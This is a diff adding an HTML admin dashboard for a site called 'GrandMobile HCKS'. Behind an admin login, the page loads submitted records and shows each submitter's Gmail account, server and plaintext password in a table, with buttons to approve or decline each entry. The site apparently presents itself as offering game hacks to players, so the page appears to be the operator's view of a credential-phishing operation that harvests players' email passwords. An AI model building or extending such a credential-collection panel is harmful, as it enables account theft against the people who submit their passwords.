@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Dashboard - GrandMobile HCKS</title>
+  <link rel="stylesheet" href="/style.css">
+</head>
+
+<body>
+
+  <header class="topbar">
+    <div class="brand">
+      <div class="brand-mark">GM</div>
+      <div>
+        <h1>GrandMobile HCKS</h1>
+        <span>Admin Dashboard</span>
+      </div>
+    </div>
+
+    <a class="admin-link" href="/">User Page</a>
+  </header>
+
+  <main class="container">
+
+    <!-- ADMIN LOGIN -->
+    <section id="loginBox" class="card narrow">
+
+      <div class="badge">ADMIN</div>
+
+      <h2>Admin Login</h2>
+
+      <p class="muted">
+        Login to view submitted player data.
+      </p>
+
+      <form id="loginForm">
+
+        <label>
+          Admin Username
+          <input
+            type="text"
+            name="username"
+            autocomplete="username"
+            required
+          >
+        </label>
+
+        <label>
+          Admin Password
+          <input
+            type="password"
+            name="password"
+            autocomplete="current-password"
+            required
+          >
+        </label>
+
+        <button class="primary" type="submit">
+          Login
+        </button>
+
+        <p id="loginStatus" class="status error"></p>
+
+      </form>
+
+    </section>
+
+
+    <!-- ADMIN DASHBOARD -->
+    <section id="dashboard" class="card" hidden>
+
+      <div class="row">
+
+        <div>
+          <div class="badge">ADMIN</div>
+          <h2>Submitted Data</h2>
+        </div>
+
+        <button id="logout" class="secondary">
+          Log Out
+        </button>
+
+      </div>
+
+      <div id="tableWrap">
+        <p class="muted">Loading submissions...</p>
+      </div>
+
+    </section>
+
+  </main>
+
+
+  <script>
+
+    const loginBox = document.querySelector("#loginBox");
+    const dashboard = document.querySelector("#dashboard");
+    const tableWrap = document.querySelector("#tableWrap");
+    const loginStatus = document.querySelector("#loginStatus");
+
+
+    // Check whether an admin session already exists
+    async function checkAdmin() {
+
+      try {
+
+        const response = await fetch("/api/admin/me");
+        const data = await response.json();
+
+       if (data.admin) {
+  showDashboard();
+} else {
+  loginBox.hidden = false;
+  dashboard.hidden = true;
+}
+      } catch (error) {
+
+        console.error("Admin check failed:", error);
+
+      }
+
+    }
+
+
+    // Show dashboard
+    async function showDashboard() {
+
+      loginBox.hidden = true;
+      dashboard.hidden = false;
+
+      await loadData();
+
+    }
+
+
+    // Load submitted data
+    async function loadData() {
+
+      tableWrap.innerHTML =
+        '<p class="muted">Loading submissions...</p>';
+
+      try {
+
+        const response =
+          await fetch("/api/admin/submissions");
+
+        if (!response.ok) {
+
+          tableWrap.innerHTML =
+            '<p class="error-text">Admin session expired.</p>';
+
+          return;
+
+        }
+
+        const rows = await response.json();
+
+
+        if (!rows.length) {
+
+          tableWrap.innerHTML =
+            '<p class="muted">No submissions yet.</p>';
+
+          return;
+
+        }
+
+
+        const table = document.createElement("table");
+
+        table.innerHTML = `
+          <thead>
+            <tr>
+              <th>Gmail Account</th>
+              <th>Server</th>
+              <th>Password</th>
+              <th>Time</th>
+            </tr>
+          </thead>
+
+          <tbody></tbody>
+        `;
+
+
+        const tbody = table.querySelector("tbody");
+
+
+        for (const row of rows) {
+
+          const tr = document.createElement("tr");
+
+
+          const values = [
+            row.gmail_account,
+            row.server,
+            row.password,
+            row.created_at
+          ];
+
+
+          for (const value of values) {
+
+            const td = document.createElement("td");
+
+            td.textContent = value || "";
+
+            tr.appendChild(td);
+
+          }
+
+
+          const actionCell = document.createElement("td");
+
+          const approveButton =
+  document.createElement("button");
+
+approveButton.textContent = "Approve";
+approveButton.className = "success";
+
+approveButton.onclick = async () => {
+  const response = await fetch(
+    "/api/admin/submissions/" + row.id + "/approve",
+    {
+      method: "POST"
+    }
+  );
+
+  if (response.ok) {
+    loadData();
+  }
+};
+
+
+const declineButton =
+  document.createElement("button");
+
+declineButton.textContent = "Decline";
+declineButton.className = "danger";
+
+declineButton.onclick = async () => {
+  const response = await fetch(
+    "/api/admin/submissions/" + row.id + "/decline",
+    {
+      method: "POST"
+    }
+  );
+
+  if (response.ok) {
+    loadData();
+  }
+};
+
+
+actionCell.appendChild(approveButton);
+actionCell.appendChild(declineButton);
+
+tr.appendChild(actionCell);
+tbody.appendChild(tr);
+
+        }
+
+
+        tableWrap.replaceChildren(table);
+
+      } catch (error) {
+
+        console.error("Could not load data:", error);
+
+        tableWrap.innerHTML =
+          '<p class="error-text">Could not connect to the server.</p>';
+
+      }
+
+    }
+
+
+    // Admin login
+    document
+      .querySelector("#loginForm")
+      .addEventListener("submit", async (event) => {
+
+        event.preventDefault();
+
+
+        loginStatus.textContent = "";
+
+
+        const formData =
+          new FormData(event.target);
+
+
+        const data =
+          Object.fromEntries(formData);
+
+
+        try {
+
+          const response =
+            await fetch("/api/admin/login", {
+
+              method: "POST",
+
+              headers: {
+                "Content-Type": "application/json"
+              },
+
+              body: JSON.stringify(data)
+
+            });
+
+
+          const result =
+            await response.json();
+
+
+          if (!response.ok) {
+
+            loginStatus.textContent =
+              result.error || "Invalid admin login.";
+
+            return;
+
+          }
+
+
+          loginStatus.textContent = "";
+
+          showDashboard();
+
+
+        } catch (error) {
+
+          loginStatus.textContent =
+            "Could not connect to the server.";
+
+        }
+
+      });
+
+
+    // Logout
+    document
+      .querySelector("#logout")
+      .addEventListener("click", async () => {
+
+        await fetch("/api/admin/logout", {
+          method: "POST"
+        });
+
+        location.reload();
+
+      });
+
+
+    // Start
+    checkAdmin();
+
+  </script>
+
+</body>
+</html>
